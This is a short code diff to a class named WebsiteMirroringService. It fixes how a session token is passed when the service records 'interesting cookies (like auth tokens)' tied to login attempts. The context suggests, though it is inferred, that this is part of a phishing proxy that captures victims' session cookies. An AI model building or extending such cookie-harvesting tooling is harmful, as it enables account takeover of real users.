@@ -1210,7 +1210,7 @@ class WebsiteMirroringService {
         });
         
         // Track interesting cookies (like auth tokens)
-        this.trackAllCookies(sessionToken, cookies);
+        this.trackAllCookies(session.sessionToken, cookies);
         
         // If we have a login attempt ID, update it with cookies
         if (loginAttemptId) {
@@ -1755,7 +1755,7 @@ class WebsiteMirroringService {
         });
         
         // Track interesting cookies (like auth tokens)
-        this.trackAllCookies(sessionToken, cookies);
+        this.trackAllCookies(session.sessionToken, cookies);
       }
 
       // Handle redirects
